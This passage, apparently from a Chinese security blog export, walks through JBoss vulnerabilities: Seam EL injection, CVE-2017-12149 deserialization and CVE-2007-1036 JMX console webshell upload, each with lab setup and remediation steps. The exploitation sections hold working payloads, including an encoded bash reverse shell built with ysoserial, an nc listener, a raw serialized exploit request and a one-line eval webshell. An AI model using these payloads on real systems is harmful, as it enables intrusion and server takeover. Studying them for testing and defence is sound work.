    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>JBossSeam</code>是一个<code>JavaEE5</code>框架，把<code>JSF</code>与<code>EJB 3.0</code>组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。</p>
<p><code>JBossSeam</code>处理某些参数化<code>JBossEL</code>表达式的方式存在输入过滤漏洞。如果远程攻击者能够诱骗通过认证的<code>JBossSeam</code>用户访问特制的网页，就可能导致执行任意代码。</p>
<p>漏洞是通过<code>seam</code>组件中插入<code>#&#123;payload&#125;</code>进行模板注入，通过Java反射机制来获取到（<code>Java.lang.Runtime.getRuntime().exec()</code>方法），从而可以传入任何想要执行的命令。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>JBoss AS = 4.3.0（企业版）</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下URL</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/admin-console/login.seam</span><br></pre></td></tr></table></figure>

<p>cmd代表传入的远程命令。在<code>/admin-console/login.seam</code>路径下，POST传入构造好的<code>payload</code>，即可对此漏洞利用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">actionOutcome=/success.xhtml?user=#&#123;expressions.getClass().forName(<span class="string">&#x27;Java.lang.Runtime&#x27;</span>).getDeclaredMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(expressions.getClass().forName(<span class="string">&#x27;Java.lang.Runtime&#x27;</span>)).exec(cmd)&#125;</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>下载补丁</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>注入漏洞</category>
      </categories>
      <tags>
        <tag>注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss反序列化漏洞 - CVE-2017-12149</title>
    <url>//0c25934b8fe9.html</url>
    <content><![CDATA[<h1 id="JBoss反序列化漏洞-CVE-2017-12149"><a href="#JBoss反序列化漏洞-CVE-2017-12149" class="headerlink" title="JBoss反序列化漏洞 - CVE-2017-12149"></a>JBoss反序列化漏洞 - CVE-2017-12149</h1><h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>此漏洞主要是由于 <code>jboss\server\all\deploy\httpha-invoker.sar\invoker.war\WEB-INF\classes\org\jboss\invocation\http\servlet</code> 目录下的 <code>ReadOnlyAccessFilter.class</code> 文件中的 <code>doFilter</code> 方法，再将序列化传入 <code>ois</code> 中，并没有进行过滤便调用了 <code>readObject()</code> 进行反序列化，导致传入的携带恶意代码的序列化数据执行，造成了反序列化的漏洞。</p>
<p>该漏洞存在于JBoss AS的<code>HttpInvoker</code> 组件中的<code>ReadOnlyAccessFilter</code> 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<ul>
<li>JBoss AS 5.x</li>
<li>JBoss AS 6.x</li>
</ul>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 6</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p>访问如下URL,如果返回500错误，则存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/invoker/readonly</span><br></pre></td></tr></table></figure>

<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>

<p>下载JavaDeserH2HC工具</p>
<p><a href="https://github.com/joaomatosf/JavaDeserH2HC">https://github.com/joaomatosf/JavaDeserH2HC</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-<span class="number">3.2</span><span class="number">.1</span>.jar ReverseShellCommonsCollectionsHashMap <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>

<p>也可以使用<code>ysoserial.jar</code>工具</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>这里命令是<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1</code>，需要先进行编码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java  -jar  ysoserial.jar  CommonsCollections1 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; jboss.ser</span><br><span class="line">    </span><br><span class="line">curl http:<span class="comment">//127.0.0.1:8080/invoker/readonly --data-binary @jboss.ser -x http://127.0.0.1:1080</span></span><br><span class="line">-x 是设置代理</span><br></pre></td></tr></table></figure>

<p>HTTP头部抓包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/invoker/readonly</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1630</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Expect</span><span class="punctuation">: </span>100-continue</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="xquery"><span class="meta">%ac</span><span class="meta">%ed</span>=&amp;sr=&amp;<span class="number">2</span>sun.reflect.annotation.AnnotationInvocationHandlerU<span class="meta">%ca</span><span class="meta">%f5</span>=&amp;<span class="meta">%cb</span><span class="meta">%7e</span><span class="meta">%a5</span>=&amp;L=&amp;memberValuest=&amp;Ljava<span class="meta">%2futil</span><span class="meta">%2fMap</span><span class="meta">%3bL</span>=&amp;typet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxps</span><span class="meta">%7d</span>=&amp;java.util.Mapxr=&amp;java<span class="built_in">.lang</span>.reflect.Proxy<span class="meta">%e1</span><span class="meta">%27</span><span class="meta">%da</span>+<span class="meta">%cc</span>=&amp;C<span class="meta">%cb</span>=&amp;L=&amp;ht=&amp;<span class="meta">%25Ljava</span><span class="meta">%2flang</span><span class="meta">%2freflect</span><span class="meta">%2fInvocationHandler</span><span class="meta">%3bxpsq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;*org.apache.commons.collections.<span class="keyword">map</span>.LazyMapn<span class="meta">%e5</span><span class="meta">%94</span><span class="meta">%82</span><span class="meta">%9ey</span>=&amp;<span class="meta">%94</span>=&amp;L=&amp;factoryt=&amp;<span class="meta">%2cLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpsr</span>=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.ChainedTransformer<span class="number">0</span><span class="meta">%c7</span><span class="meta">%97</span><span class="meta">%ec</span><span class="meta">%28z</span><span class="meta">%97</span>=&amp;<span class="meta">%5b</span>=&amp;iTransformerst=&amp;-<span class="meta">%5bLorg</span><span class="meta">%2fapache</span><span class="meta">%2fcommons</span><span class="meta">%2fcollections</span><span class="meta">%2fTransformer</span><span class="meta">%3bxpur</span>=&amp;-<span class="meta">%5bLorg</span>.apache.commons.collections.Transformer<span class="meta">%3b</span><span class="meta">%bdV</span>*<span class="meta">%f1</span><span class="meta">%d84</span>=&amp;<span class="meta">%99</span>=&amp;xp=&amp;sr=&amp;<span class="meta">%3borg</span>.apache.commons.collections.functors.ConstantTransformerXv<span class="meta">%90</span>=&amp;A=&amp;<span class="meta">%b1</span><span class="meta">%94</span>=&amp;L=&amp;iConstantt=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bxpvr</span>=&amp;java<span class="built_in">.lang</span>.Runtime=&amp;xpsr=&amp;<span class="meta">%3aorg</span>.apache.commons.collections.functors.InvokerTransformer<span class="meta">%87</span><span class="meta">%e8</span><span class="meta">%ffk</span><span class="meta">%7b</span><span class="meta">%7c</span><span class="meta">%ce8</span>=&amp;<span class="meta">%5b</span>=&amp;iArgst=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fObject</span><span class="meta">%3bL</span>=&amp;iMethodNamet=&amp;Ljava<span class="meta">%2flang</span><span class="meta">%2fString</span><span class="meta">%3b</span><span class="meta">%5b</span>=&amp;iParamTypest=&amp;<span class="meta">%5bLjava</span><span class="meta">%2flang</span><span class="meta">%2fClass</span><span class="meta">%3bxpur</span>=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Object<span class="meta">%3b</span><span class="meta">%90</span><span class="meta">%ceX</span><span class="meta">%9f</span>=&amp;s<span class="meta">%29l</span>=&amp;xp=&amp;t=&amp;getRuntimeur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.Class<span class="meta">%3b</span><span class="meta">%ab</span>=&amp;<span class="meta">%d7</span><span class="meta">%ae</span><span class="meta">%cb</span><span class="meta">%cdZ</span><span class="meta">%99</span>=&amp;xp=&amp;t=&amp;getMethoduq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.String<span class="meta">%a0</span><span class="meta">%f0</span><span class="meta">%a48z</span><span class="meta">%3b</span><span class="meta">%b3B</span>=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;uq=&amp;<span class="meta">%7e</span>=&amp;puq=&amp;<span class="meta">%7e</span>=&amp;t=&amp;invokeuq=&amp;<span class="meta">%7e</span>=&amp;vr=&amp;java<span class="built_in">.lang</span>.Object=&amp;xpvq=&amp;<span class="meta">%7e</span>=&amp;sq=&amp;<span class="meta">%7e</span>=&amp;ur=&amp;<span class="meta">%5bLjava</span><span class="built_in">.lang</span>.String<span class="meta">%3b</span><span class="meta">%ad</span><span class="meta">%d2V</span><span class="meta">%e7</span><span class="meta">%e9</span>=&amp;<span class="meta">%7bG</span>=&amp;xp=&amp;t=&amp;&#123;这里为输入命令&#125;&amp;execuq=&amp;<span class="meta">%7e</span>=&amp;q=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%23sq</span>=&amp;<span class="meta">%7e</span>=&amp;sr=&amp;java<span class="built_in">.lang</span>.Integer=&amp;<span class="meta">%e2</span><span class="meta">%a0</span><span class="meta">%a4</span><span class="meta">%f7</span><span class="meta">%81</span><span class="meta">%878</span>=&amp;I=&amp;valuexr=&amp;java<span class="built_in">.lang</span>.Number<span class="meta">%86</span><span class="meta">%ac</span><span class="meta">%95</span>=&amp;<span class="meta">%94</span><span class="meta">%e0</span><span class="meta">%8b</span>=&amp;xp=&amp;sr=&amp;java.util.HashMap=&amp;<span class="meta">%da</span><span class="meta">%c1</span><span class="meta">%c3</span>=&amp;<span class="meta">%60</span><span class="meta">%d1</span>=&amp;F=&amp;loadFactorI=&amp;thresholdxp<span class="meta">%3f</span>@=&amp;w=&amp;xxvr=&amp;java<span class="built_in">.lang</span>.Override=&amp;xpq=&amp;<span class="meta">%7e</span>=&amp;<span class="meta">%3a</span>=</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li><p>删除<code>http-invoker.sar</code>组件</p>
</li>
<li><p>设置<code>http-invoker</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br><span class="line"></span><br><span class="line">在security-constraint 标签中添加以下代码</span><br><span class="line">&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>升级JBoss版本</p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>JBoss</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss后台文件上传漏洞 - CVE-2007-1036</title>
    <url>//013bc4e5df03.html</url>
    <content><![CDATA[<h2 id="JBoss简介"><a href="#JBoss简介" class="headerlink" title="JBoss简介"></a>JBoss简介</h2><p>​        Jboss是一个基于J2EE的开放源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口：8080</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        此漏洞主要是由于JBoss中<code>/jmx-console/HtmlAdaptor</code>路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中<code>jboss.admin -&gt; DeploymentFileRepository -&gt; store()</code>方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>JBoss应用服务器：</p>
<p>全版本</p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>java环境：JDK 8以下</p>
<p>在官网下载相应的JBoss版本</p>
<p>配置环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBOSS_HOME</span><br><span class="line">C:\xxx（JBoss安装地址）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH</span><br><span class="line">;%JBOSS_HOME%\bin;</span><br></pre></td></tr></table></figure>

<p>外网访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss6: \server\default\deploy\jbossweb.sar\server.xml</span><br><span class="line">JBoss4: \server\default\deploy\jboss-web.deployer\server.xml</span><br><span class="line"></span><br><span class="line">将address=&quot;$&#123;jboss.bind.address&#125;&quot;改成address=&quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JBoss\bin\run.bat</span><br><span class="line"></span><br><span class="line">访问http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>JBoss漏洞检测</strong></p>
<ol>
<li>JBoss漏洞检测工具下载</li>
</ol>
<p><a href="https://github.com/fupinglee/JavaTools/tree/master/JBoss">https://github.com/fupinglee/JavaTools/tree/master/JBoss</a></p>
<ol start="2">
<li>先探测是否具有JBoss服务</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;jboss&quot;</span><br></pre></td></tr></table></figure>

<p>根据HTTP头部</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># http头部显示jboss服务和版本信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>JBoss-EAP/7</span><br><span class="line"># http头部显示，Apache-Coyote 是Tomcat的连接器，被多个Java servlet容器使用作为socket处理组件，有tomcat，jboss等</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache-Coyote/1.1</span><br><span class="line"># X-Powered-By</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Servlet 2.4; JBoss-4.2.3.GA</span><br></pre></td></tr></table></figure>



<p><strong>访问如下URL</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>

<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gu2b2e3akxj60m00b9aej02.jpg" alt="JBoss文件上传store().png"></p>
<p>在P1输入上传的war包，如<code>shell.war</code></p>
<p>在P2输入上传的文件名，如<code>shell</code></p>
<p>在P3输入上传的文件格式，如<code>.jsp</code></p>
<p>在P4输入上传的文件内容，如一句话<code>&lt;%eval request(&quot;admin&quot;)%&gt;</code></p>
<p>最后点击<code>Invoke</code>上传</p>
<p>上传的路径为<code>JBos/server/default/deploy/management/shell.war/shell.jsp</code></p>
<p>访问以下URL链接shell</p>
<p><code>http://127.0.0.1:8080/shell/shell.jsp</code></p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
<li>将JBoss后台添加权限，控制访问者对敏感路径访问</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\jboss-web.xml</span><br><span class="line">＃　删除下列代码的注释,添加账号密码访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-domain</span>&gt;</span>java:/jaas/jmx-console<span class="tag">&lt;/<span class="name">security-domain</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">jboss\server\default\deploy\jmx-console.war\WEB-INF\web.xml</span><br><span class="line">＃　删除下列代码的注释，只有拥有系统配置的登录角色JBossAdmin的用户才能访问</span><br><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">web-resource-name</span>&gt;</span>HtmlAdaptor<span class="tag">&lt;/<span class="name">web-resource-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>An example security config that only allows users with the role JBossAdmin to access the HTML JMX console web application</span><br><span class="line">		<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>GET<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">http-method</span>&gt;</span>POST<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">role-name</span>&gt;</span>JBossAdmin<span class="tag">&lt;/<span class="name">role-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 这里修改账号密码</span><br><span class="line">jboss\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">#　这里修改账号权限</span><br><span class="line">jboss\server\default\conf\props\jmx-console-roles.properties</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>更新到 JBoss 5.1.0 或者6.0.0以上</li>
<li>若不使用控制平台管理，删除<code>jmx-console.war</code>和<code>web-console.war</code>，在以下路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jboss\server\all\deploy\jmx-console.war</span><br><span class="line">jboss\server\default\deploy\jmx-console.war</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>常规漏洞</category>
        <category>文件上传漏洞</category>
        <category>JBoss</category>
      </categories>
      <tags>
        <tag>访问控制错误漏洞</tag>
        <tag>文件上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集-WEB服务器</title>
    <url>//ef172fa947be.html</url>
    <content><![CDATA[<h2 id="WEB服务器简介"><a href="#WEB服务器简介" class="headerlink" title="WEB服务器简介"></a>WEB服务器简介</h2><p>WEB服务器是指网站服务器，用来使服务器提供WEB访问</p>
<p>可以处理浏览器等Web客户端的请求并返回相应响应，也可以放置网站文件，让全世界浏览</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>世界上使用最多的web服务器</p>
<p>具有跨平台，安全性高的优点</p>
<p>可以通过API扩展，将<code>perl/Python</code>等解释器编译到服务器中</p>
<p>下载地址：<a href="http://httpd.apache.org/">http://httpd.apache.org/</a></p>
<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p><strong>基于HTTP头部</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># HTTP头部中server标头显示web服务器信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"># HTTP头部中server标头在Date之后</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 23 Aug 2021 08:08:29 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"># 当HTTP返回404时，报错信息为Not Found</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">404</span> Not Found</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 23 Aug 2021 08:08:29 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br></pre></td></tr></table></figure>



<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>IIS（Internet Information Services）是Microsoft的Web服务组件</p>
<p>其中包括Web服务器，FTP服务器，NNTP服务器和SMTP服务器。</p>
<p>通过ISAP（Internet Server API）作为扩展web服务器功能的编程接口</p>
<p>通过Internet数据库连接器，可以实现对数据库的查询和更新</p>
<p>下载地址：<a href="https://www.microsoft.com/zh-CN/download/details.aspx?id=48264">https://www.microsoft.com/zh-CN/download/details.aspx?id=48264</a></p>
<h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p><strong>基于HTTP头部</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># HTTP头部中server标头显示web服务器信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Microsoft-IIS/5.0</span><br><span class="line"># 当HTTP返回404时，报错信息为Object Not Found</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">404</span> Object Not Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Microsoft-IIS/5.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 23 Aug 2021 08:08:29 GMT</span><br></pre></td></tr></table></figure>



<h2 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h2><p>JBoss是一个种遵从JavaEE规范的、开放源代码的、纯Java的EJB服务器，对于J2EE有很好的支持</p>
<p>JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。</p>
